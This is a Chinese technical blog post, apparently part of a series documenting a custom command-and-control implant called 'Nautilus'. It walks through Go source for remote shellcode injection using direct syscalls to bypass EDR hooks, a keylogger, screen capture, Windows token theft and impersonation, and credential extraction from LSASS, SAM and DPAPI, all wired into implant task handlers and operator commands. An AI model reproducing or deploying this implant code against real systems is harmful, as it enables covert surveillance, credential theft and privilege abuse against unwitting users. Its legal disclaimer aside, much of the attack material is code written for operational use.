---
layout: single
title: "Nautilus (二)：后渗透与Token操作"
date: 2026-07-08
categories:
  - github项目
  - Nautilus
  - 后渗透
---

> **⚠️ 法律声明：本文内容仅供授权安全测试和教育研究使用。**

## 概述

进程注入解决了"在哪跑代码"，Token 操作解决了"以什么身份跑代码"。这两个维度合在一起，才是完整的后渗透能力——从"在哪跑代码"到"以什么身份跑代码"。

本章覆盖七个主题：

1. **进程注入**：使用 Halo's Gate 直接 syscall 绕过 EDR 用户态 hook
2. **截屏**：通过 GDI API 捕获桌面画面，返回 PNG 格式
3. **键盘记录**：通过 `GetAsyncKeyState` 轮询捕获全局按键
4. **Token 原理**：Windows Access Token 的类型、完整性级别和五大操作
5. **Token 操作实现**：syscall 封装 + 四大操作代码
6. **凭据提取概述**：LSASS、SAM、DPAPI 三条凭据路径
7. **非管理员场景**：降级策略与实战适配

***

## 一、进程注入（直接 Syscall）

### 1.1 为什么不用标准 API

EDR 通过 inline hook `ntdll.dll` 中的 `NtOpenProcess`、`NtAllocateVirtualMemory`、`NtWriteVirtualMemory`、`NtCreateThreadEx` 等函数来监控进程注入：

```
正常调用（被拦截）：
  用户代码 → kernel32!WriteProcessMemory  ← EDR hook
           → ntdll!NtWriteVirtualMemory   ← EDR hook
           → syscall → 内核

Nautilus 调用（绕过）：
  用户代码 → rawSyscall12(SYSCALL) → 内核  ← 不经过任何被 hook 的 DLL
```

所有 NT 函数通过 **Halo's Gate** 动态获取 SSN（System Service Number），再调用汇编 stub 直进入内核。12 参数汇编 stub 的实现细节属于免杀体系范畴，详见[第四章免杀体系](2026-07-09-Nautilus(四)-免杀体系.md)。

### 1.2 注入流程

```go
func InjectShellcode(pid uint32, shellcode []byte) error {
    // 1. NtOpenProcess — 打开目标进程
    cid := &clientID{UniqueProcess: uintptr(pid)}
    status := evasion.DirectNtOpenProcess(
        &hProcess, 0x1F0FFF, &objAttr, &cid)

    // 2. NtAllocateVirtualMemory — 在目标进程中分配 RW 内存
    status = evasion.DirectNtAVM(
        hProcess, &remoteAddr, 0, &shellcodeSize,
        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

    // 3. NtWriteVirtualMemory — 写入 shellcode
    status = evasion.DirectNtWVM(
        hProcess, remoteAddr, shellcode, &written)

    // 4. NtProtectVirtualMemory — 改为 RX
    var oldProtect uint32
    status = evasion.DirectNtPVM(
        hProcess, &remoteAddr, &shellcodeSize,
        PAGE_EXECUTE_READ, &oldProtect)

    // 5. NtCreateThreadEx — 创建远程线程执行 shellcode
    status = evasion.DirectNtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, nil,
        hProcess, remoteAddr, 0, // StartAddress=shellcode 地址
        0, 0, 0, 0, nil) // CreateFlags=0（立即执行）
}
```

注入链路：`NtOpenProcess → NtAVM → NtWVM → NtPVM → NtCreateThreadEx`，全程通过 Halo's Gate 直接 syscall（详见第四章免杀体系），不经过 ntdll.dll 的任何 EDR hook 点。

### 1.3 自注入模式

除了远程注入，Nautilus 还支持自注入（将 shellcode 注入自身进程），用于测试：

```go
func InjectShellcodeSelf(shellcode []byte) error {
    // NtAllocateVirtualMemory + NtProtectVirtualMemory(RW→RX)
    // 然后通过 EnumWindows 回调执行 shellcode
    CallEnumWindows(addr, 0)
}
```

***

## 二、截屏（GDI Direct）

### 2.1 实现原理

使用 Windows GDI API 直接操作桌面 DC：

```
1. GetDC(0) → 获取桌面设备上下文
2. CreateCompatibleDC → 创建内存 DC
3. CreateCompatibleBitmap → 创建兼容位图
4. SelectObject → 选入位图
5. BitBlt → 从桌面 DC 复制到内存 DC
6. GetDIBits → 提取像素数据（32-bit BGRA）
7. 构建 image.RGBA → PNG 编码
```

### 2.2 核心代码

```go
func CaptureScreenshot() ([]byte, error) {
    // 获取屏幕尺寸
    w, _, _ := procGetSystemMetrics.Call(SM_CXSCREEN)
    h, _, _ := procGetSystemMetrics.Call(SM_CYSCREEN)

    // 获取桌面 DC
    hdcScreen, _, _ := procGetDC.Call(0)

    // 创建兼容 DC + 位图
    hdcMem, _, _ := procCreateCompatibleDC.Call(hdcScreen)
    hBitmap, _, _ := procCreateCompatibleBitmap.Call(hdcScreen, w, h)
    procSelectObject.Call(hdcMem, hBitmap)

    // 复制屏幕内容
    procBitBlt.Call(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY)

    // 提取像素数据（32-bit BGRA，从上到下）
    bi := bitmapInfo{
        Header: bitmapInfoHeader{
            Width:  int32(width), Height: -int32(height), // 负值=从上到下
            BitCount: 32, Compression: BI_RGB,
        },
    }
    pixels := make([]byte, width*height*4)
    procGetDIBits.Call(hdcMem, hBitmap, 0, h, ...)

    // Go 标准库编码为 PNG
    img := image.NewRGBA(image.Rect(0, 0, width, height))
    copy(img.Pix, pixels)
    png.Encode(&buf, img)
    return buf.Bytes(), nil
}
```

### 2.3 设计要点

- **Height 为负值**：`-int32(height)` 表示像素数据从上到下排列（Windows 默认从下到上）
- **32-bit BGRA**：即使屏幕是 24-bit，也使用 32-bit 格式确保对齐
- **PNG 编码**：使用 Go 标准库 `image/png`，无需额外依赖
- **返回 base64**：C2 通信中传输 base64 编码的 PNG 数据，前端直接渲染为 `<img>`

***

## 三、键盘记录（GetAsyncKeyState 轮询）

### 3.1 为什么不用 SetWindowsHookEx

`SetWindowsHookEx` 是传统的键盘记录方式，但存在明显问题：

- 需要消息循环（`GetMessage` + `DispatchMessage`）
- hook 回调在 Go 的 `syscall.NewCallback` 中执行，限制较多
- 低权限进程可能无法安装全局 hook（UIPI 限制）

Nautilus 改用 `GetAsyncKeyState` 轮询——在 30ms 间隔的 goroutine 中扫描所有虚拟键状态：

```go
func keyloggerPollLoop() {
    ticker := time.NewTicker(30 * time.Millisecond)
    for {
        select {
        case <-stopCh:
            return
        case <-ticker.C:
            pollKeys()
        }
    }
}
```

### 3.2 按键扫描

```go
func pollKeys() {
    // 扫描所有标准虚拟键 (0x08~0x5D)
    for vk := uint32(0x08); vk <= 0x5D; vk++ {
        state, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
        if state&0x8000 != 0 {   // 高位置 1 = 按键当前按下
            handleKeyDown(vk)
        }
    }
    // 扫描功能键 (F1~F12)
    for vk := uint32(0x70); vk <= 0x7B; vk++ { ... }
}
```

### 3.3 按键处理

```go
func handleKeyDown(vk uint32) {
    // 防重复记录
    if vk == lastVk { return }
    lastVk = vk

    // 记录窗口标题变化
    if windowTitle != lastWin {
        buf.WriteString(fmt.Sprintf("\n\n[%s]\n", windowTitle))
    }

    // 特殊键 → 标签
    switch vk {
    case 0x08: buf.WriteString("[BS]")       // 退格
    case 0x0D: buf.WriteString("[ENTER]\n")  // 回车
    case 0x20: buf.WriteString(" ")          // 空格
    case 0x1B: buf.WriteString("[ESC]")      // 退出
    // ...
    }

    // 普通字符 → 转换为可打印字符
    char := vkToChar(vk, shift)
    if char >= 0x20 {
        buf.WriteByte(char)
    }
}
```

### 3.4 虚拟键码到字符转换

简化版字符映射（完整版需 `ToUnicodeEx`）：

```go
func vkToChar(vk uint32, shift bool) byte {
    // 字母：A-Z / a-z
    if vk >= 'A' && vk <= 'Z' {
        if shift { return byte(vk) }
        return byte(vk + 32)
    }
    // 数字：根据 Shift 状态映射
    if vk >= '0' && vk <= '9' {
        if shift {
            return map[uint32]byte{'0':')', '1':'!', '2':'@', ...}[vk]
        }
        return byte(vk)
    }
    // 特殊字符：VK_OEM_* 系列
    // 0xBA=';', 0xBB='=', 0xBC=',', 0xBD='-', 0xBE='.', 0xBF='/'
    // 0xC0='`', 0xDB='[', 0xDC='\\', 0xDD=']', 0xDE='\''
}
```

### 3.5 生命周期管理

```go
// 服务端控制台
> keylogon                 // 启动键盘记录
> keylogoff                // 停止并获取结果

// API 调用
{"task_type": "keylogon", "params": {}}
{"task_type": "keylogoff", "params": {}}
```

启动后，键盘记录器在后台 goroutine 中持续运行，所有按键记录到内存缓冲区。停止时一次性返回所有捕获的文本。

***

## 四、Token 原理

### 4.1 每进程一张身份证

登录 Windows 时，系统创建一个 Access Token：

```
┌─────────────────────────────────────────┐
│  Access Token                           │
├─────────────────────────────────────────┤
│  User SID:    S-1-5-21-xxx-500         │  ← 你是谁
│  Groups:      Administrators, Users...   │  ← 属于哪些组
│  Privileges:  SeDebugPrivilege,          │  ← 特殊权限
│               SeImpersonatePrivilege    │
│  Integrity:   Medium/High/System        │  ← 信任等级
│  Token Type:  Primary / Impersonation    │  ← 令牌类型
│  Session ID:  1                         │  ← 登录会话
└─────────────────────────────────────────┘
```

每个进程持有此 Token 的副本。`explorer.exe` 持有你的 Token，`lsass.exe` 持有 SYSTEM Token。

### 4.2 Token 类型

| 类型 | 能否创建进程 | 典型场景 |
|------|:---:|------|
| **Primary Token** | ✅ | `explorer.exe`、`cmd.exe` |
| **Impersonation Token** | ❌ | 服务端模拟客户端（IIS） |

只有 Primary Token 能通过 `CreateProcessAsUser` 创建新进程。但**线程级模拟**（`NtSetInformationThread(ThreadImpersonationToken)`）只接受 Impersonation Token——StealToken 后需 `DuplicateToken` 转为 Impersonation Token 即可设置到线程；只有需要创建新进程时才需 `DuplicateTokenEx` 转为 Primary Token。

### 4.3 完整性级别

| 级别 | SID | 典型进程 |
|------|-----|---------|
| System (16384) | `S-1-16-16384` | `lsass.exe`, `services.exe` |
| High (12288) | `S-1-16-12288` | 管理员进程 |
| Medium (8192) | `S-1-16-8192` | 标准用户进程 |

**关键规则**：低完整性不能写高完整性进程内存。

### 4.4 五大 Token 操作

#### 枚举 Token（EnumTokens）

遍历所有进程，列出各进程的用户和权限：

```
PID: 1234  User: DOMAIN\Admin     Groups: Administrators
PID: 5678  User: NT AUTHORITY\SYSTEM  Privileges: SeDebugPrivilege
```

#### 窃取 Token（StealToken）

```
1. NtOpenProcess(PID, PROCESS_QUERY_INFORMATION)
2. NtOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE)
3. NtDuplicateToken(hToken, ..., TokenImpersonation)  → 复制为 Impersonation Token
4. NtSetInformationThread(ThreadImpersonationToken, dupToken) → 设置到当前线程
```

**场景**：
- 从 `lsass.exe` 偷 SYSTEM Token → 获得最高权限
- 从 `explorer.exe` 偷域用户 Token → 访问域内文件共享

#### 模拟 Token（Impersonate）

不同于 StealToken（复制为独立 Token），Impersonate 是**线程级**的临时切换：

```go
NtSetInformationThread(ThreadImpersonationToken, hToken)  // 线程切换身份
// ... 执行操作 ...
NtSetInformationThread(ThreadImpersonationToken, null)     // 恢复
```

#### 恢复身份（Rev2Self）

将当前线程的 Impersonation Token 设为 `NULL`，恢复到进程原始身份：

```go
var nullToken uintptr = 0
NtSetInformationThread(GetCurrentThread(), ThreadImpersonationToken, &nullToken, ...)
```

持续模拟会留下痕迹。OpSec 要求：完成操作后立即恢复。

#### 伪造 Token（MakeToken）

已知凭据时可凭空创建 Token：

```
LogonUserW(username, domain, password, LOGON32_LOGON_NETWORK, ...)
→ 获得 Token → NtSetInformationThread 设置到当前线程 → 以该用户身份操作
```

注意：`LogonUserW` 使用 `LOGON32_LOGON_NETWORK` 登录类型时**不需要** `SeTcbPrivilege`。只有 `LOGON32_LOGON_INTERACTIVE`、`LOGON32_LOGON_BATCH`、`LOGON32_LOGON_SERVICE` 才需要。非管理员进程可以直接调用 `LOGON32_LOGON_NETWORK`。

---

## 五、Token 操作实现

### 5.1 syscall 封装

Nautilus 在 `evasion/direct_syscall_windows.go` 中实现了 4 个直接 syscall 包装器，通过 Halo's Gate 解析的 SSN + 间接 SYSCALL 执行，不经过 ntdll.dll 的 EDR hook 点：

```go
// 打开进程 Token
func DirectNtOpenProcessToken(processHandle uintptr, desiredAccess uint32,
    tokenHandle *uintptr) uintptr

// 复制 Token（指定 Token 类型）
func DirectNtDuplicateToken(existingTokenHandle uintptr, desiredAccess uint32,
    objAttr *uintptr, effectiveOnly uint32, tokenType uint32,
    newTokenHandle *uintptr) uintptr

// 查询 Token 信息（用户、组、完整性级别等）
func DirectNtQueryInformationToken(tokenHandle uintptr, infoClass uint32,
    info *byte, infoLen uint32, returnLen *uint32) uintptr

// 系统进程列表枚举
func DirectNtQuerySystemInformation(infoClass uint32, info *byte,
    infoLen uint32, returnLen *uint32) uintptr
```

**重要**：`NtSetInformationThread` 未使用直接 syscall 路径。原因：线程 Token 操作需要传递 `GetCurrentThread()` 伪句柄（值 -2），而直接 SYSCALL 指令不在 ntdll 地址空间内，内核无法正确处理伪句柄的特殊转换。因此 `NtSetInformationThread` 改用 `ntdll.dll` 的 `LazyDLL` 调用路径，既保留了伪句柄的正确处理，又经过 ntdll 合法地址空间，避免 CFG 检测。

```go
// 通过 ntdll.dll 调用 NtSetInformationThread（伪句柄 -2 经直接 syscall 会失败）
ntdll := syscall.NewLazyDLL("ntdll.dll")
procNtSetInfoThread := ntdll.NewProc("NtSetInformationThread")
r1, _, _ := procNtSetInfoThread.Call(
    ^uintptr(1), // GetCurrentThread() pseudohandle (-2)
    uintptr(ThreadImpersonationToken),
    uintptr(unsafe.Pointer(&token)),
    uintptr(unsafe.Sizeof(token)))
```

> **踩坑**：Go 64 位下 `uintptr(0xFFFFFFFE)` = `0x00000000FFFFFFFE`，不是伪句柄 -2（`0xFFFFFFFFFFFFFFFE`）。正确写法是 `^uintptr(1)`，Go 按位取反 1 得到 `0xFFFFFFFFFFFFFFFE`。

### 5.2 枚举 Token（`EnumTokens`）

通过 `CreateToolhelp32Snapshot` 枚举所有进程，对每个进程用直接 syscall 打开 Token 并查询用户和完整性级别。**非管理员运行时自动降级权限**：

```go
func EnumTokens() (string, error) {
    hSnapshot, _, _ := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer evasion.DirectNtClose(hSnapshot)

    for each process {
        // 1. 打开进程 — 两级降级
        status := evasion.DirectNtOpenProcess(&hProcess,
            PROCESS_QUERY_INFORMATION, &oa, &cid)
        if NtStatusIsError(status) {
            // 降级: PROCESS_QUERY_LIMITED_INFORMATION (Vista+ 无需特殊权限)
            status = evasion.DirectNtOpenProcess(&hProcess,
                PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid)
            if NtStatusIsError(status) { continue }
        }

        // 2. 打开 Token — 两级降级
        status = evasion.DirectNtOpenProcessToken(hProcess,
            TOKEN_QUERY|TOKEN_DUPLICATE, &hToken)
        if NtStatusIsError(status) {
            // 降级: 仅 TOKEN_QUERY (无法复制，但能查询信息)
            status = evasion.DirectNtOpenProcessToken(hProcess,
                TOKEN_QUERY, &hToken)
            if NtStatusIsError(status) { continue }
        }

        // 3. 查询 TokenUser → 解析 SID → 用户名
        // 4. 查询 TokenIntegrityLevel → 完整性级别
    }
}
```

降级策略使得非管理员用户也能枚举大部分进程的 Token 信息，只有跨用户进程（如 SYSTEM）无法打开。

输出格式：
```
PID      Name     User                                        Integrity
6204     GameInput LAPTOP-XXX\nk7                             Medium
11640    explorer LAPTOP-XXX\nk7                              Medium
16812    ctfmon   LAPTOP-XXX\nk7                              High
```

### 5.3 窃取 Token（`StealToken`）

从目标进程窃取 Token，复制为 Impersonation Token，设置到当前线程：

```go
func StealToken(pid uint32) (string, error) {
    // 1. NtOpenProcess → 进程句柄 (降级: QUERY_INFORMATION → QUERY_LIMITED)
    // 2. NtOpenProcessToken → Token 句柄 (降级: DUP|QUERY|IMPERSONATE → QUERY)
    // 3. NtQueryInformationToken(TokenUser) → 查询用户名
    // 4. NtDuplicateToken(..., SecurityImpersonation, TokenImpersonation)
    //    → 复制为 Impersonation Token（线程模拟只需 Impersonation，不需要 Primary）
    // 5. NtSetInformationThread(ThreadImpersonationToken, dupToken)
    //    → 通过 ntdll LazyDLL 设置到当前线程
    // 6. 查询 dupToken 详细信息 → 返回用户/完整性/特权/组
}
```

关键设计：

- **Token 类型选择**：`NtSetInformationThread(ThreadImpersonationToken)` 只接受 Impersonation Token，因此 `NtDuplicateToken` 指定 `TokenImpersonation` 而非 `TokenPrimary`。只有后续需要 `CreateProcessAsUser` 创建新进程时才需转为 Primary Token。
- **非管理员降级**：`NtOpenProcess` 和 `NtOpenProcessToken` 都有两级降级策略，Token 仅 QUERY 无法 DUPLICATE 时仍查询用户名并返回有意义的错误信息。
- **详细返回**：成功后返回完整的 Token 信息，包括用户、完整性级别、特权列表（`*` 表示已启用）、组列表。

返回示例：
```
Stole token from PID 11640
  User: LAPTOP-XXX\nk7
  Integrity: Medium
  Privileges (1):
    SeChangeNotifyPrivilege *
  Groups (15):
    S-1-16-8192 [D] [E]
    BUILTIN\Administrators [M]
    BUILTIN\Users [M] [D] [E]
```

组属性标记：`[M]` Mandatory、`[D]` EnabledByDefault、`[E]` Enabled、`[L]` LogonId。

### 5.4 恢复身份（`Rev2Self`）

将当前线程的 Impersonation Token 设为 `NULL`，恢复到进程原始身份：

```go
func Rev2Self() (string, error) {
    var nullToken uintptr = 0
    ntdll := syscall.NewLazyDLL("ntdll.dll")
    procNtSetInfoThread := ntdll.NewProc("NtSetInformationThread")
    r1, _, _ := procNtSetInfoThread.Call(
        ^uintptr(1), // GetCurrentThread() pseudohandle (-2)
        uintptr(ThreadImpersonationToken),
        uintptr(unsafe.Pointer(&nullToken)),
        uintptr(unsafe.Sizeof(nullToken)))
    if NtStatusIsError(uintptr(r1)) {
        return "", fmt.Errorf("Rev2Self failed: 0x%08X", uint32(r1))
    }

    // 返回恢复后的身份验证信息
    return fmt.Sprintf("Reverted to self\n  Process token: %s\n  Elevated: %v",
        GetUsername(), IsElevated()), nil
}
```

返回示例：
```
Reverted to self
  Process token: nk7
  Elevated: false
```

### 5.5 伪造 Token（`MakeToken`）

已知用户名/密码时，通过 `LogonUserW` 创建新的登录会话 Token：

```go
func MakeToken(username, password, domain string) (string, error) {
    // 1. LogonUserW(username, domain, password,
    //    LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &hToken)
    //    LOGON32_LOGON_NETWORK 不需要 SeTcbPrivilege
    // 2. 验证 hToken 有效性 + 查询 TokenUser
    // 3. NtSetInformationThread(ThreadImpersonationToken, hToken)
    //    → 通过 ntdll LazyDLL 设置到当前线程
    // 4. 返回 Token 用户验证信息
}
```

关键细节：

- **`LOGON32_LOGON_NETWORK` 不需要 `SeTcbPrivilege`**，非管理员进程可直接调用。只有 `LOGON32_LOGON_INTERACTIVE`/`BATCH`/`SERVICE` 才需要。
- **Token 用户验证**：`LogonUserW` 在用户不存在但 Guest 账户启用时，可能返回 Guest Token 而非失败。代码通过 `NtQueryInformationToken(TokenUser)` 验证实际 Token 用户，在返回值中明确显示，避免操作者误以为拿到了目标用户身份。
- **错误处理**：`r1 == 0 || hToken == 0` 双重检查，防止 LazyDLL 返回值误判。

返回示例（成功）：
```
Created token for .\admin
  Token user: LAPTOP-XXX\admin
```

返回示例（错误密码）：
```
LogonUserW failed: errno=1326  (ERROR_LOGON_FAILURE)
```

---

## 六、凭据提取概述

Token 操作常需配合凭据提取。Windows 凭据存储在三条路径：

### 6.1 LSASS 内存

`lsass.exe` 内存中保存登录凭据（明文密码/NTLM Hash/Kerberos Ticket）。提取方案：

- 通过直接 syscall 读取 `lsass.exe` 内存（绕过 EDR hook）
- 从内存中解析 wdigest/msv/kerberos/tspkg 凭据结构
- 或生成 Minidump 离线分析

### 6.2 SAM/SECURITY 注册表

本地用户账户的 NTLM hash 存储在 `HKLM\SAM` 和 `HKLM\SECURITY`。需 SYSTEM 权限读取。

### 6.3 DPAPI 保护凭据

Chrome 密码、Wi-Fi 密码、RDP 凭据等由 DPAPI 加密。可通过 `CryptUnprotectData` 在主用户上下文中解密。

---

## 七、非管理员场景

实战中 agent 通常不以管理员权限运行。Nautilus 的 Token 操作针对非管理员场景做了专门优化：

| 操作 | 管理员 | 非管理员 |
|------|--------|---------|
| **EnumTokens** | 枚举所有进程 | 枚举同用户进程（降级 QUERY_LIMITED） |
| **StealToken** | 窃取任意进程 | 窃取同用户进程（含 High 完整性如 ctfmon.exe） |
| **Rev2Self** | ✅ | ✅ 无差异 |
| **MakeToken** | 可用 INTERACTIVE 登录 | 可用 NETWORK 登录（不需 SeTcb） |

非管理员无法窃取跨用户进程（如 SYSTEM）的 Token，会返回明确的错误信息：

```
NtOpenProcess(4) failed: 0xC0000022 (not admin, cannot open other user's process)
```

***

## 八、C2 集成

### 8.1 任务类型扩展

```go
TaskScreenshot    TaskType = 0x0601  // 截屏 → 返回 base64 PNG
TaskKeylogOn      TaskType = 0x0602  // 启动键盘记录
TaskKeylogOff     TaskType = 0x0603  // 停止键盘记录 → 返回文本
TaskEnumTokens    TaskType = 0x0701  // 枚举进程 Token
TaskStealToken    TaskType = 0x0702  // 窃取目标进程 Token
TaskRev2Self      TaskType = 0x0703  // 恢复原始身份
TaskMakeToken     TaskType = 0x0704  // 伪造 Token
```

### 8.2 植入体分发

```go
case encode.TaskScreenshot:
    data, err := core.CaptureScreenshot()
    resp.Output = evasion.B64Encode(data)  // 前端直接渲染 <img>

case encode.TaskKeylogOn:
    err := core.StartKeylogger()
    resp.Output = "keylogger started"

case encode.TaskKeylogOff:
    output, err := core.StopKeylogger()
    resp.Output = output  // 前端渲染为 <pre> 文本块

case encode.TaskEnumTokens:
    output, err := token.EnumTokens()
    resp.Output = output

case encode.TaskStealToken:
    output, err := token.StealToken(pid)
    resp.Output = output

case encode.TaskRev2Self:
    output, err := token.Rev2Self()
    resp.Output = output

case encode.TaskMakeToken:
    output, err := token.MakeToken(user, pass, domain)
    resp.Output = output
```

### 8.3 服务端命令

```bash
> screenshot                       # 截屏
> keylogon                         # 启动键盘记录
> keylogoff                        # 停止并获取键盘记录结果
> tokens                           # 枚举所有进程的 Token
> steal-token <pid>                # 窃取目标进程 Token
> rev2self                         # 恢复原始身份
> make-token <user> <pass> <domain> # 伪造 Token
```

Web UI 中对应操作按钮：Screenshot / Keylog On/Off / Tokens / Steal Token / Rev2Self / Make Token。

截屏结果以 base64 PNG 嵌入 `<img>` 标签（点击可放大），键盘记录和 Token 操作结果以预格式化文本块展示。

***

## 九、能力对比更新

| 能力       | Nautilus (v1.0) | Nautilus (v1.1) | Sliver | Havoc |
| -------- | :-------------: | :-------------: | :----: | :---: |
| 进程注入     |        ❌        |        ✅        |    ✅   |   ✅   |
| 截屏       |        ❌        |        ✅        |    ✅   |   ✅   |
| 键盘记录     |        ❌        |        ✅        |    ✅   |   ✅   |
| Token 操作  |        ❌        |        ✅        |    ✅   |   ✅   |
| 凭据提取     |        ❌        |        ✅        |    ✅   |   ✅   |
| 文件管理     |        ✅        |        ✅        |    ✅   |   ✅   |
| Shell 执行 |        ✅        |        ✅        |    ✅   |   ✅   |

***

## 上一篇 / 下一篇

- [Nautilus (一)：通信协议深度](2026-07-08-Nautilus(一)-通信协议深度.md)
- [Nautilus (二)：免杀体系](2026-07-09-Nautilus(三)-免杀体系.md)
